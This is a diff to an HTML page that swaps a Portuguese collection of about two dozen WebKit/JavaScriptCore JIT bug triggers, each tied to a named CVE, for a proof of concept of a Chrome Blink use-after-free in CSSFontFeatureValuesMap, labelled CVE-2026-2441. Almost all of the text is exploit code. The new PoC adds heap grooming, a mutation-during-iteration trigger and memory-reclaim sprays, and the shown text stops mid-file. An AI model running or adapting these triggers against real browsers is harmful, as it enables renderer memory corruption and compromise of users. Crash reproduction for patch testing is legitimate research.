@@ -1,895 +1,344 @@
 <!DOCTYPE html>
+<!--
+  CVE-2026-2441 — CSSFontFeatureValuesMap Iterator Invalidation (UAF) PoC
+  
+  Vulnerability: Blink CSS engine, third_party/blink/renderer/core/css/css_font_feature_values_map.cc
+  Root cause: FontFeatureValuesMapIterationSource held a raw pointer to the FontFeatureAliases
+              HashMap (const FontFeatureAliases* aliases_). When the map is mutated during
+              iteration (set/delete), the HashMap rehashes, the old storage is freed, and the
+              pointer becomes dangling → Use-After-Free.
+  
+  Fix: const FontFeatureAliases* aliases_  →  const FontFeatureAliases aliases_ (deep copy)
+  Commit: 63f3cb4864c64c677cd60c76c8cb49d37d08319c
+  
+  Target: Chrome <= 144.0.x (all versions prior to 145.0.7632.75)
+  Expected result (unpatched): Renderer process crash (SIGSEGV / heap corruption)
+  Expected result (patched):   No crash, test passes normally
+-->
 <html>
-<head><meta charset="UTF-8"><title>Testes04 — WebKit CVE Techniques</title></head>
+<head>
+  <meta charset="utf-8">
+  <title>CVE-2026-2441 PoC — CSSFontFeatureValuesMap UAF</title>
+  <style>
+    body { font-family: monospace; background: #111; color: #0f0; padding: 20px; }
+    #log { white-space: pre; font-size: 13px; }
+    .ok   { color: #0f0; }
+    .warn { color: #ff0; }
+    .fail { color: #f44; }
+    .info { color: #08f; }
+  </style>
+
+  <!--
+    @font-feature-values at-rule: CSS Fonts Level 4 specification.
+    This rule creates a CSSFontFeatureValuesRule CSSOM object.
+    rule.styleset  → CSSFontFeatureValuesMap (HashMap wrapper)
+    The vulnerability is triggered by the iteration + mutation combination on this Map.
+  -->
+  <style id="target-style">
+    @font-feature-values VulnTestFont {
+      @styleset {
+        entry_a: 1;
+        entry_b: 2;
+        entry_c: 3;
+        entry_d: 4;
+        entry_e: 5;
+        entry_f: 6;
+        entry_g: 7;
+        entry_h: 8;
+      }
+    }
+  </style>
+</head>
 <body>
-
-<p>Tecnicas baseadas em CVEs reais do WebKit/JSC. Cada botao e isolado.</p>
-<p>CVEs referenciados: CVE-2023-32439, CVE-2023-41993, CVE-2022-32792, CVE-2024-23222, CVE-2024-44308, CVE-2022-22620, CVE-2018-4441, CVE-2020-9802</p>
-
-<button onclick="runAll()">RODAR TODOS</button>
-<br><br>
-<button onclick="t76()">Teste 76</button>
-<button onclick="t77()">Teste 77</button>
-<button onclick="t78()">Teste 78</button>
-<button onclick="t79()">Teste 79</button>
-<button onclick="t80()">Teste 80</button>
-<button onclick="t81()">Teste 81</button>
-<button onclick="t82()">Teste 82</button>
-<button onclick="t83()">Teste 83</button>
-<button onclick="t84()">Teste 84</button>
-<button onclick="t85()">Teste 85</button>
-<button onclick="t86()">Teste 86</button>
-<button onclick="t87()">Teste 87</button>
-<button onclick="t88()">Teste 88</button>
-<button onclick="t89()">Teste 89</button>
-<button onclick="t90()">Teste 90</button>
-<button onclick="t91()">Teste 91</button>
-<button onclick="t92()">Teste 92</button>
-<button onclick="t93()">Teste 93</button>
-<button onclick="t94()">Teste 94</button>
-<button onclick="t95()">Teste 95</button>
-<button onclick="t96()">Teste 96</button>
-<button onclick="t97()">Teste 97</button>
-<button onclick="t98()">Teste 98</button>
-<button onclick="t99()">Teste 99</button>
-<button onclick="t100()">Teste 100</button>
-
-<pre id="o"></pre>
+<h2>CVE-2026-2441 — CSSFontFeatureValuesMap UAF PoC</h2>
+<div id="log"></div>
 
 <script>
-function log(m){ document.getElementById('o').textContent += m + '\n'; }
+"use strict";
 
-function runAll(){
-  log('=== RODAR TODOS: inicio ===');
-  t76();  t77();  t78();  t79();  t80();
-  t81();  t82();  t83();  t84();  t85();
-  t86();  t87();  t88();  t89();  t90();
-  t91();  t92();  t93();  t94();  t95();
-  t96();  t97();  t98();  t99();  t100();
-  log('=== RODAR TODOS: fim ===');
+const log = document.getElementById("log");
+function print(msg, cls = "") {
+  const span = document.createElement("span");
+  span.className = cls;
+  span.textContent = msg + "\n";
+  log.appendChild(span);
 }
 
-// T76 — CVE-2023-32439: for-in + in operator DFG CSE collision
-// EnumeratorNextUpdateIndexAndMode e HasIndexedProperty compartilham
-// o mesmo HeapLocation no CSE, confundindo boolean com numero pos-FTL
-function t76(){
-  log('Teste 76: inicio');
-  try {
-    const arr = [0];
-    function jitter(){
-      for(let _ in arr){
-        return 0 in arr;
-      }
-    }
-    let a = jitter();
-    for(let i = 0; i < 0x100000; i++) jitter();
-    let b = jitter();
-    try {
-      let f64 = new Float64Array(16);
-      f64[b | 0] = 3.14;
-    } catch(e){}
-  } catch(e){}
-  log('Teste 76: fim');
+print("[*] CVE-2026-2441 PoC starting...", "info");
+print("[*] Target: CSSFontFeatureValuesMap iterator invalidation (UAF)", "info");
+print("[*] Blink source: css_font_feature_values_map.cc", "info");
+print("");
+
+// ─── 1. Obtain the CSSOM object ──────────────────────────────────────────────
+const sheet = document.getElementById("target-style").sheet;
+if (!sheet || sheet.cssRules.length === 0) {
+  print("[!] ERROR: @font-feature-values rule not found.", "fail");
+  throw new Error("CSS rule not found");
 }
 
-// T77 — CVE-2023-41993: JIT retorna GetterSetter no lugar de Symbol
-// JIT especializa para Symbol mas getter pode retornar tipo interno errado
-function t77(){
-  log('Teste 77: inicio');
-  try {
-    function jitme(o){ return o.prop; }
-    const symObj = { prop: Symbol('test') };
-    for(let i = 0; i < 0x10000; i++) jitme(symObj);
+const rule = sheet.cssRules[0];
+print("[+] CSSFontFeatureValuesRule found: " + rule.fontFamily, "ok");
 
-    const getterObj = {};
-    let callN = 0;
-    Object.defineProperty(getterObj, 'prop', {
-      get: function(){
-        callN++;
-        if(callN % 2 === 0) return 42;
-        return Symbol('s' + callN);
-      }, configurable: true
-    });
-    for(let i = 0; i < 0x10000; i++) jitme(getterObj);
-    let r = jitme(getterObj);
-    try { Object(r).description; } catch(e){}
-  } catch(e){}
-  log('Teste 77: fim');
+// CSSFontFeatureValuesMap object
+// In Blink, this object is a CSSOM wrapper around the FontFeatureAliases HashMap.
+const map = rule.styleset;
+if (!map) {
+  print("[!] ERROR: rule.styleset is not accessible. Browser may not support this API.", "fail");
+  throw new Error("styleset not available");
 }
+print("[+] CSSFontFeatureValuesMap obtained. Size: " + map.size, "ok");
+print("");
 
-// T78 — CVE-2022-32792: B3 ReduceStrength integer overflow via Int32 underflow
-// FTL remove CheckSub quando range analysis prova (erroneamente) que nao ha overflow
-function t78(){
-  log('Teste 78: inicio');
-  try {
-    function foo(a){
-      let lhs = (((a|0) & 1) + 0x7fff) << 16 >> 16;
-      let rhs = -(0x80000000 - 5);
-      let tmp = 10;
-      if(a < 2) tmp = lhs + rhs;
-      return tmp;
-    }
-    for(let i = 0; i < 0x100000; i++) foo(i);
-    let r1 = foo(0);
-    let r2 = foo(1);
-    try {
-      let arr = new Int32Array(16);
-      arr[r1 | 0] = 1;
-      arr[r2 | 0] = 1;
-    } catch(e){}
-  } catch(e){}
-  log('Teste 78: fim');
+// ─── 2. Heap Grooming ────────────────────────────────────────────────────────
+// Goal: Bring the heap into a predictable state.
+// By creating multiple @font-feature-values rules, we allocate same-sized
+// FontFeatureAliases objects. This facilitates memory reclaim after the UAF.
+print("[*] Starting heap grooming...", "info");
+
+const groomRules = [];
+const groomStyle = document.createElement("style");
+document.head.appendChild(groomStyle);
+
+for (let i = 0; i < 50; i++) {
+  groomStyle.sheet.insertRule(
+    `@font-feature-values GroomFont${i} { @styleset { g${i}: ${i}; } }`,
+    groomStyle.sheet.cssRules.length
+  );
+  groomRules.push(groomStyle.sheet.cssRules[groomStyle.sheet.cssRules.length - 1]);
 }
+print("[+] " + groomRules.length + " groom objects created.", "ok");
 
-// T79 — CVE-2024-23222: type confusion em switch/case JIT
-// JIT especializa switch para Int32; objeto com valueOf confunde a tabela
-function t79(){
-  log('Teste 79: inicio');
-  try {
-    function switchFn(v){
-      switch(v){
-        case 0: return 'zero';
-        case 1: return 'one';
-        case 2: return 'two';
-        case 3: return 'three';
-        default: return 'other';
-      }
-    }
-    for(let i = 0; i < 0x30000; i++) switchFn(i % 4);
+// ─── 3. UAF Trigger — Iterator Invalidation ─────────────────────────────────
+//
+// Vulnerability mechanism (unpatched Blink):
+//
+//   When CreateIterationSource() is called:
+//     FontFeatureValuesMapIterationSource(map, aliases_)
+//     → aliases_ (raw pointer) points to the internal HashMap
+//     → iterator_ = aliases_->begin()
+//
+//   When FetchNextItem() is called:
+//     → iterator_->key is read
+//
+//   If map.delete() or map.set() is called in between:
+//     → HashMap rehashes (new allocation, old storage freed)
+//     → aliases_ now points to freed memory (dangling pointer)
+//     → iterator_ is also invalidated
+//     → Next FetchNextItem() → USE-AFTER-FREE → CRASH
+//
+print("[*] Starting UAF trigger...", "info");
+print("[*] Strategy: iterator.next() + map.delete() + map.set() x N (force rehash)", "info");
+print("");
 
-    let callN = 0;
-    const evil = {
-      valueOf(){ callN++; return callN % 5; },
-      [Symbol.toPrimitive](){ return callN % 4; }
-    };
-    for(let i = 0; i < 1000; i++){
-      try { switchFn(evil); } catch(e){}
-    }
+let crashDetected = false;
+let iterationCount = 0;
 
-    function switchStr(s){
-      switch(s){
-        case 'a': return 1;
-        case 'b': return 2;
-        case 'c': return 3;
-        default:  return 0;
-      }
-    }
-    for(let i = 0; i < 0x30000; i++) switchStr(['a','b','c'][i%3]);
-    let n2 = 0;
-    const evil2 = { toString(){ return ['a','b','c','d'][n2++ % 4]; } };
-    for(let i = 0; i < 1000; i++){
-      try { switchStr(evil2); } catch(e){}
-    }
-  } catch(e){}
-  log('Teste 79: fim');
-}
+try {
+  // Create iterator — at this point Blink creates an IterationSource with a raw pointer
+  const iterator = map.entries();
 
-// T80 — CVE-2024-44308: DFG TypedArray PutByVal uso de registrador nao-inicializado
-// Motor usa registrador nao-inicializado como valor ao escrever em TypedArray
-// quando tipo do valor e ambiguo apos especializacao JIT
-function t80(){
-  log('Teste 80: inicio');
-  try {
-    function storeToTA(ta, idx, val){
-      ta[idx] = val;
-      return ta[idx];
-    }
-    const ta = new Int32Array(64);
-    for(let i = 0; i < 0x30000; i++) storeToTA(ta, i % 64, i);
-
-    const vals = [1.5, null, undefined, true, false, {valueOf(){return 42;}}, NaN, Infinity, -0];
-    for(let v of vals){
-      try { storeToTA(ta, 0, v); } catch(e){}
+  let step = 0;
+  while (step < 20) {
+    // iterator.next() → FetchNextItem() call
+    // Unpatched Blink: reads through dangling pointer
+    const result = iterator.next();
+    
+    if (result.done) {
+      print("    [.] Iterator exhausted (step=" + step + ")", "warn");
+      break;
     }
 
-    const fa = new Float64Array(64);
-    function storeF64(idx, val){ fa[idx] = val; return fa[idx]; }
-    for(let i = 0; i < 0x30000; i++) storeF64(i % 64, i * 0.1);
+    const [key, value] = result.value;
+    iterationCount++;
+    print("    [>] Entry: " + key + " = " + JSON.stringify(value) + " (step=" + step + ")", "ok");
 
-    const evil = { valueOf(){ return 4.890909195324353e-270; } };
-    try { storeF64(0, evil); }                      catch(e){}
-    try { storeF64(0, {valueOf(){ return NaN; }}); } catch(e){}
-  } catch(e){}
-  log('Teste 80: fim');
-}
+    // ── MUTATION: Modify the HashMap ─────────────────────────────────────
+    // This triggers a HashMap rehash.
+    // In unpatched Blink, the aliases_ pointer becomes dangling after this.
+    
+    // Delete the current key
+    map.delete(key);
 
-// T81 — CVE-2022-22620: UAF em History API
-// Operacoes rapidas de navegacao enquanto DOM e modificado podem invalidar ponteiros
-function t81(){
-  log('Teste 81: inicio');
-  try {
-    for(let i = 0; i < 50; i++){
-      try { history.pushState({ i: i }, '', '#s' + i); } catch(e){}
-    }
-    for(let i = 0; i < 10; i++){
-      try { history.go(-1); }    catch(e){}
-      try { history.go(1); }     catch(e){}
-      try { history.back(); }    catch(e){}
-      try { history.forward(); } catch(e){}
-    }
-    try { history.replaceState({ x: 1 }, '', '#rep'); } catch(e){}
-    try {
-      var buf = new ArrayBuffer(64);
-      history.pushState(buf, '', '#buf');
-    } catch(e){}
-  } catch(e){}
-  log('Teste 81: fim');
-}
-
-// T82 — CVE-2018-4441: JSArray unshiftCount com ArrayStorage
-// unshift em array esparso grande pode overflow o calculo do novo tamanho
-function t82(){
-  log('Teste 82: inicio');
-  try {
-    var arr = [];
-    arr[0] = 1.1;
-    arr[1] = 2.2;
-    arr.x = 'property';
-    for(var i = 2; i < 512; i++) arr[i] = i * 1.1;
-    for(var i = 10; i < 500; i += 3) delete arr[i];
-
-    try { arr.unshift(99,98,97,96,95,94,93,92,91,90); } catch(e){}
-    try { arr.splice(0, 0, 'a','b','c','d','e'); }       catch(e){}
-    try { arr.copyWithin(0, 100, 200); }                  catch(e){}
-    try { arr.copyWithin(100, 0, 200); }                  catch(e){}
-  } catch(e){}
-  log('Teste 82: fim');
-}
-
-// T83 — CVE-2020-9802: JIT com arguments object e tipos variados pos-warmup
-function t83(){
-  log('Teste 83: inicio');
-  try {
-    function sum(a, b, c){ return a + b + c; }
-    for(let i = 0; i < 0x30000; i++) sum(1.1, 2.2, 3.3);
-
-    try { sum({valueOf(){return 1;}}, 2, 3); }    catch(e){}
-    try { sum(null, undefined, true); }            catch(e){}
-    try { sum(Symbol('x'), 2, 3); }               catch(e){}
-
-    function sumArgs(){
-      let total = 0;
-      for(let i = 0; i < arguments.length; i++) total += arguments[i];
-      return total;
-    }
-    for(let i = 0; i < 0x30000; i++) sumArgs(1, 2, 3, 4, 5);
-    try { sumArgs(1, null, {valueOf(){return 99;}}, true, '1'); } catch(e){}
-    try { sumArgs.apply(null, new Float64Array([1.1, 2.2, 3.3])); } catch(e){}
-    try {
-      (function(){ sumArgs.apply(null, arguments); })(9,8,7,6,5,4,3,2,1);
-    } catch(e){}
-  } catch(e){}
-  log('Teste 83: fim');
-}
-
-// T84 — Heap spray com valores Float64 que simulam NaN-boxing de ponteiros JSC
-// JSVALUE64: tag 0xFFFF prefix = ponteiro heap; injetar valores que se parecem ponteiros
-function t84(){
-  log('Teste 84: inicio');
-  try {
-    const poisonValues = [
-      3.857900e+149,   // bits: 0xFFFF000000000001
-      3.858e+149,
-      2.122e-314,
-      5.0e-324,
-      -0,
-      NaN,
-    ];
-
-    const arrays = [];
-    for(let v of poisonValues){
-      let f = new Float64Array(64);
-      f.fill(v);
-      arrays.push(f);
+    // Add many new keys → force rehash
+    // WTF::HashMap default load factor ~0.75; 512+ entries will definitely trigger rehash
+    // Each set() call potentially reallocates internal storage
+    for (let i = 0; i < 512; i++) {
+      map.set("spray_" + step + "_" + i, [i, i + 1, i + 2]);
     }
 
-    function readAndUse(f, idx){
-      let v = f[idx];
-      return v * 2 + 1;
-    }
-    for(let i = 0; i < 0x30000; i++) readAndUse(arrays[0], 0);
-    for(let a of arrays){
-      try { readAndUse(a, 0); }  catch(e){}
-      try { readAndUse(a, 63); } catch(e){}
-    }
-
-    const shared = new ArrayBuffer(8);
-    const f64v = new Float64Array(shared);
-    const u32v = new Uint32Array(shared);
-    for(let v of poisonValues){
-      f64v[0] = v;
-      let lo = u32v[0];
-      let hi = u32v[1];
-      if(hi === 0xFFFF || hi === 0x0000){
-        let arr2 = new Int32Array(256);
-        try { arr2[lo % 256] = 0xDEAD; } catch(e){}
-      }
-    }
-  } catch(e){}
-  log('Teste 84: fim');
-}
-
-// T85 — JIT inline cache megamorphic com getter e Proxy como ultimo receptor
-// IC polimorfico com muitas estruturas -> megamorphic; getter e Proxy invalidam IC
-function t85(){
-  log('Teste 85: inicio');
-  try {
-    function getProp(o){ return o.x; }
-    const mono = { x: 1 };
-    for(let i = 0; i < 0x10000; i++) getProp(mono);
-
-    const objs = [];
-    for(let i = 0; i < 200; i++){
-      const o = { x: i };
-      if(i % 3 === 0) o['extra_' + i] = i;
-      if(i % 5 === 0) o.y = i;
-      if(i % 7 === 0) o.z = i;
-      objs.push(o);
-    }
-    for(let i = 0; i < 0x10000; i++) getProp(objs[i % 200]);
-
-    const withGetter = {};
-    Object.defineProperty(withGetter, 'x', {
-      get: function(){ return 42; }, configurable: true
-    });
-    for(let i = 0; i < 1000; i++){
-      try { getProp(withGetter); } catch(e){}
-    }
-
-    const noProto = Object.create(null);
-    noProto.x = 99;
-    for(let i = 0; i < 1000; i++){
-      try { getProp(noProto); } catch(e){}
-    }
-
-    const prx = new Proxy({x: 7}, { get(t,k){ return t[k]; } });
-    for(let i = 0; i < 1000; i++){
-      try { getProp(prx); } catch(e){}
-    }
-  } catch(e){}
-  log('Teste 85: fim');
-}
-
-// T86 — JIT Array.push com mudanca de ArrayMode: DoubleArray -> ArrayWithArrayStorage
-// JIT especializa push para DoubleArray; inserir objeto forca transicao de modo
-function t86(){
-  log('Teste 86: inicio');
-  try {
-    function fillArray(arr, val){ arr.push(val); return arr.length; }
-    const arr = [];
-    for(let i = 0; i < 0x10000; i++) fillArray(arr, i * 0.1);
-    arr.length = 0;
-
-    try { fillArray(arr, { valueOf(){ return 1.5; } }); } catch(e){}
-    try { fillArray(arr, 'string'); }                     catch(e){}
-    try { fillArray(arr, null); }                         catch(e){}
-    try { fillArray(arr, Symbol('s')); }                  catch(e){}
-
-    const arr2 = [];
-    for(let i = 0; i < 0x10000; i++) arr2.push(i);
-    arr2.push(1.5);
-
-    function sumArr(a){
-      let s = 0;
-      for(let i = 0; i < a.length; i++) s += a[i];
-      return s;
-    }
-    for(let i = 0; i < 0x10000; i++) sumArr(arr2);
-    arr2[0] = { valueOf(){ return 1; } };
-    try { sumArr(arr2); } catch(e){}
-  } catch(e){}
-  log('Teste 86: fim');
-}
-
-// T87 — RegExp exec JIT com lastIndex como getter que retorna objeto
-// JIT faz inline do acesso a .lastIndex assumindo inteiro simples
-function t87(){
-  log('Teste 87: inicio');
-  try {
-    const re = /(\w+)/g;
-    const str = 'hello world foo bar baz';
-    function runExec(r, s){ return r.exec(s); }
-
-    for(let i = 0; i < 0x20000; i++){
-      re.lastIndex = 0;
-      runExec(re, str);
-    }
-
-    let getCount = 0;
-    Object.defineProperty(re, 'lastIndex', {
-      get(){ getCount++; return getCount % 3 === 0 ? {valueOf(){return 0;}} : 0; },
-      set(v){},
-      configurable: true
-    });
-    for(let i = 0; i < 1000; i++){
-      try { runExec(re, str); } catch(e){}
-    }
-
-    const reSticky = /\w+/y;
-    let lastIdx = 0;
-    Object.defineProperty(reSticky, 'lastIndex', {
-      get(){ return lastIdx; },
-      set(v){ lastIdx = typeof v === 'number' ? v : 0; },
-      configurable: true
-    });
-    for(let i = 0; i < 200; i++){
-      try { reSticky.exec(str); } catch(e){}
-    }
-  } catch(e){}
-  log('Teste 87: fim');
-}
-
-// T88 — JIT inline de metodo com mudanca de estrutura do objeto receptor durante execucao
-// JIT assume estrutura constante do this; adicionar/deletar prop invalida inline cache
-function t88(){
-  log('Teste 88: inicio');
-  try {
-    class Container {
-      constructor(){ this.value = 0; this.extra = null; }
-      getValue(){ return this.value; }
-      setValue(v){ this.value = v; }
-    }
-    const c = new Container();
-    function loop(obj){
-      for(let i = 0; i < 100; i++){
-        obj.setValue(i);
-        obj.getValue();
-      }
-    }
-    for(let i = 0; i < 0x10000; i++) loop(c);
-
-    const c2 = new Container();
-    let loopCount = 0;
-    const origSet = Container.prototype.setValue;
-    Container.prototype.setValue = function(v){
-      loopCount++;
-      if(loopCount === 500) this.newProp = 'change';
-      if(loopCount === 1000) delete this.extra;
-      this.value = v;
-    };
-    try { loop(c2); } catch(e){}
-    Container.prototype.setValue = origSet;
-  } catch(e){}
-  log('Teste 88: fim');
-}
-
-// T89 — Resizable ArrayBuffer: TypedArray com length invalidada apos resize
-// TypedArray criado antes do resize tem length/byteOffset que podem ficar invalidos
-function t89(){
-  log('Teste 89: inicio');
-  try {
-    if(typeof ArrayBuffer.prototype.resize === 'undefined'){
-      // Fallback: transfer como proxy para testar view detachada
-      var buf = new ArrayBuffer(64);
-      var view = new Uint32Array(buf);
-      for(var i = 0; i < 16; i++) view[i] = i;
-      var cyclic = {buf: buf, self: null};
-      cyclic.self = cyclic;
-      postMessage(cyclic, '*', [buf]);
-      try { for(var i = 0; i < 16; i++) view[i] = 0xDEAD; } catch(e){}
-      throw new Error('nao suportado');
-    }
-
-    const rb = new ArrayBuffer(64, { maxByteLength: 1024 });
-    const view32 = new Uint32Array(rb);
-    for(let i = 0; i < 16; i++) view32[i] = i * 0x01010101;
-
-    function accessView(v, idx){ return v[idx]; }
-    for(let i = 0; i < 0x20000; i++) accessView(view32, i % 16);
-
-    try { rb.resize(512); } catch(e){}
-    for(let i = 16; i < 128; i++){
-      try { accessView(view32, i); } catch(e){}
-    }
-    try { rb.resize(8); } catch(e){}
-    for(let i = 2; i < 16; i++){
-      try { accessView(view32, i); } catch(e){}
-    }
-
-    function writeView(v, idx, val){ v[idx] = val; }
-    for(let i = 0; i < 0x20000; i++) writeView(view32, 0, i);
-    try { rb.resize(4); } catch(e){}
-    for(let i = 0; i < 128; i++){
-      try { writeView(view32, i, 0xDEAD); } catch(e){}
-    }
-  } catch(e){}
-  log('Teste 89: fim');
-}
-
-// T90 — DFG CheckStructure eliminado via constant folding + mudanca de prototype
-// DFG remove CheckStructure quando prova que estrutura e constante;
-// setPrototypeOf invalida estrutura mas watchpoint pode nao disparar
-function t90(){
-  log('Teste 90: inicio');
-  try {
-    function makeBase(){ return { x: 1, y: 2, z: 3 }; }
-    function getX(o){ return o.x; }
-
-    const objs = [];
-    for(let i = 0; i < 100; i++) objs.push(makeBase());
-    for(let i = 0; i < 0x20000; i++) getX(objs[i % 100]);
-
-    const victim = objs[50];
-    Object.setPrototypeOf(victim, { x: 999, extra: true });
-    for(let i = 0; i < 1000; i++){
-      try { getX(victim); }         catch(e){}
-      try { getX(objs[i % 100]); }  catch(e){}
-    }
-
-    function addPropMidJIT(o, key, val){
-      o.x;
-      o[key] = val;
-      return o.x;
-    }
-    for(let i = 0; i < 0x20000; i++) addPropMidJIT(makeBase(), 'stable', 1);
-    for(let i = 0; i < 1000; i++){
-      try { addPropMidJIT(makeBase(), 'new_' + i, i); } catch(e){}
-    }
-  } catch(e){}
-  log('Teste 90: fim');
-}
-
-// T91 — async/await com OSR exit durante resumption de await
-// async function compilada pelo JIT pode ter OSR exit ao retomar de um await;
-// estado do stack frame pode ser inconsistente com o que JIT espera
-function t91(){
-  log('Teste 91: inicio');
-  try {
-    async function hotAsync(n){
-      let a = n * 2;
-      await Promise.resolve();
-      let b = a + 1;
-      await Promise.resolve();
-      return b * 2;
-    }
-    const promises = [];
-    for(let i = 0; i < 0x10000; i++) promises.push(hotAsync(i));
-    Promise.all(promises.slice(0, 100)).catch(function(){});
-
-    async function triggerOSR(){
-      try { await hotAsync({valueOf(){return 1;}}); } catch(e){}
-      try { await hotAsync(null); }                   catch(e){}
-      try { await hotAsync('string'); }               catch(e){}
-    }
-    triggerOSR().catch(function(){});
-  } catch(e){}
-  log('Teste 91: fim');
-}
-
-// T92 — IC para get-by-id com heranca 10 niveis; injecao de metodo no meio da chain
-// IC aprende lookup path de 10 niveis; nova propriedade no nivel 5 invalida o path
-function t92(){
-  log('Teste 92: inicio');
-  try {
-    function buildChain(depth){
-      let proto = { sharedMethod(){ return this.value; } };
-      for(let i = 0; i < depth; i++){
-        let next = Object.create(proto);
-        next['level' + i] = i;
-        proto = next;
-      }
-      return proto;
-    }
-    const chain = buildChain(10);
-    const obj = Object.create(chain);
-    obj.value = 42;
-
-    function callMethod(o){ return o.sharedMethod(); }
-    for(let i = 0; i < 0x20000; i++) callMethod(obj);
-
-    let protoRef = Object.getPrototypeOf(obj);
-    for(let level = 0; level < 5; level++) protoRef = Object.getPrototypeOf(protoRef);
-    protoRef.sharedMethod = function(){ return this.value * 2; };
-
-    for(let i = 0; i < 1000; i++){
-      try { callMethod(obj); } catch(e){}
-    }
-
-    delete chain.sharedMethod;
-    for(let i = 0; i < 1000; i++){
-      try { callMethod(obj); } catch(e){}
-    }
-  } catch(e){}
-  log('Teste 92: fim');
-}
-
-// T93 — FTL bounds check elimination com calculo de indice que overflows Int32
-// FTL elimina bounds check quando prova range; overflow no somatorio quebra a prova
-function t93(){
-  log('Teste 93: inicio');
-  try {
-    const SIZE = 256;
-    const arr = new Int32Array(SIZE);
-    for(let i = 0; i < SIZE; i++) arr[i] = i;
-
-    function safeRead(base, offset){
-      let idx = ((base | 0) + (offset | 0)) | 0;
-      if(idx >= 0 && idx < SIZE) return arr[idx];
-      return -1;
-    }
-    for(let i = 0; i < 0x100000; i++) safeRead(i % 200, i % 50);
-
-    const edgeCases = [
-      [0x7FFFFFFF, 1], [-1, 0], [0x7FFF0000, 0x10000],
-      [SIZE - 1, 1], [SIZE, 0], [-0x80000000, -1],
-    ];
-    for(let [b, o] of edgeCases){
-      try { safeRead(b, o); } catch(e){}
-    }
-
-    function unsafeRead(base, offset){
-      return arr[((base | 0) + (offset | 0)) | 0];
-    }
-    for(let i = 0; i < 0x100000; i++) unsafeRead(i % 200, i % 50);
-    for(let [b, o] of edgeCases){
-      try { unsafeRead(b, o); } catch(e){}
-    }
-  } catch(e){}
-  log('Teste 93: fim');
-}
-
-// T94 — String slice/substring com indices que overflow Int32 apos JIT
-// JIT especializa para Int32 indices; valores extremos podem bypassar bounds check
-function t94(){
-  log('Teste 94: inicio');
-  try {
-    const str = 'abcdefghijklmnopqrstuvwxyz'.repeat(100);
-    function sliceIt(s, start, end){ return s.slice(start, end); }
-    function substrIt(s, start, len){ return s.substring(start, len); }
-
-    for(let i = 0; i < 0x20000; i++){
-      sliceIt(str, i % 100, (i % 100) + 10);
-      substrIt(str, i % 100, 5);
-    }
-
-    const edgeIdxs = [
-      [-1, 0], [0, -1], [0x7FFFFFFF, 0x7FFFFFFF],
-      [str.length, 0], [NaN, 5], [5, NaN],
-      [Infinity, 10], [-Infinity, 10],
-    ];
-    for(let [s, e] of edgeIdxs){
-      try { sliceIt(str, s, e); }  catch(e){}
-      try { substrIt(str, s, e); } catch(e){}
-      try { str.at(s); }           catch(e){}
-    }
-  } catch(e){}
-  log('Teste 94: fim');
-}
-
-// T95 — Symbol.hasInstance com JIT: instanceof com handler que retorna tipo errado
-// JIT inline o resultado como boolean; handler que retorna objeto ou numero confunde
-function t95(){
-  log('Teste 95: inicio');
-  try {
-    class Good { static [Symbol.hasInstance](v){ return typeof v === 'number'; } }
-    function checkInstance(v){ return v instanceof Good; }
-    for(let i = 0; i < 0x20000; i++) checkInstance(i % 2 === 0 ? 1 : 'x');
-
-    let callN = 0;
-    Good[Symbol.hasInstance] = function(v){
-      callN++;
-      if(callN % 3 === 0) return {valueOf(){ return true; }};
-      if(callN % 5 === 0) return 42;
-      if(callN % 7 === 0) throw new Error('hasInstance_throws');
-      return callN % 2 === 0;
-    };
-    for(let i = 0; i < 1000; i++){
-      try { checkInstance(i); } catch(e){}
-    }
-
-    const pCtor = new Proxy(Good, {
-      get(t, k){
-        if(k === Symbol.hasInstance) return function(v){ return v > 0; };
-        return Reflect.get(t, k);
-      }
-    });
-    for(let i = 0; i < 500; i++){
-      try { (-1) instanceof pCtor; } catch(e){}
-      try { (1) instanceof pCtor; }  catch(e){}
-    }
-  } catch(e){}
-  log('Teste 95: fim');
-}
-
-// T96 — Generator.prototype.return() durante yield* com yield no finally
-// return() no outer deve propagar para inner via inner.return();
-// yield no finally do inner cria estado complexo de resumption
-function t96(){
-  log('Teste 96: inicio');
-  try {
-    function* inner(){
+    // Also modify groom objects — fill the freed memory
+    for (let g = 0; g < groomRules.length; g++) {
       try {
-        for(let i = 0; i < 1000; i++) yield i;
-      } finally {
-        yield 'inner_finally';
-      }
+        groomRules[g].styleset.set("reclaim_" + step + "_" + g, [step]);
+      } catch(e) {}
     }
-    function* middle(){
-      try { yield* inner(); } finally { yield* inner(); }
-    }
-    function* outer(){ yield* middle(); }
 
-    const gen = outer();
-    try { gen.next(); }              catch(e){}
-    try { gen.next(); }              catch(e){}
-    try { gen.return('stop'); }      catch(e){}
-    try { gen.next(); }              catch(e){}
-    try { gen.throw(new Error()); }  catch(e){}
+    step++;
+  }
 
-    const gen2 = outer();
-    for(let i = 0; i < 5; i++){ try { gen2.next(); } catch(e){} }
-    try { gen2.return('mid'); } catch(e){}
-    try { gen2.next(); }        catch(e){}
-    try { gen2.next(); }        catch(e){}
-  } catch(e){}
-  log('Teste 96: fim');
+  print("");
+  print("[+] Iteration completed (" + iterationCount + " entries processed).", "ok");
+
+} catch (e) {
+  crashDetected = true;
+  print("[!] EXCEPTION caught: " + e.message, "fail");
+  print("[!] This may be the UAF manifesting at the JavaScript layer.", "fail");
 }
 
-// T97 — eval dentro de funcao JIT-compilada com escopo de closure
-// JIT pode fazer dead-store elimination em variaveis que eval precisa;
-// presenca de eval deve impedir DSE mas versoes antigas de JSC podem nao garantir
-function t97(){
-  log('Teste 97: inicio');
-  try {
-    function makeScope(seed){
-      let x = seed;
-      let y = seed * 2;
-      let z = seed * 3;
-      function compute(){ return x + y + z; }
-      function withEval(){
-        let r = x + y + z;
-        try { eval('x + y + z'); } catch(ex){}
-        return r;
-      }
-      return { compute, withEval };
-    }
-    const scope = makeScope(42);
-    for(let i = 0; i < 0x20000; i++) scope.compute();
-    for(let i = 0; i < 1000; i++){
-      try { scope.withEval(); } catch(e){}
-    }
+// ─── 4. Results ──────────────────────────────────────────────────────────────
+print("");
+print("─".repeat(60), "info");
+print("[*] RESULTS:", "info");
 
-    function jitFn(a, b, c){
-      let sum = a + b + c;
-      let fn = new Function('return ' + sum);
-      return fn();
-    }
-    for(let i = 0; i < 0x20000; i++) jitFn(1, 2, 3);
-    try { jitFn(1.1, {valueOf(){return 2;}}, 3); } catch(e){}
-  } catch(e){}
-  log('Teste 97: fim');
+const ua = navigator.userAgent;
+const chromeMatch = ua.match(/Chrome\/([\d.]+)/);
+const chromeVersion = chromeMatch ? chromeMatch[1] : "unknown";
+print("[*] Chrome version: " + chromeVersion, "info");
+
+// Version comparison
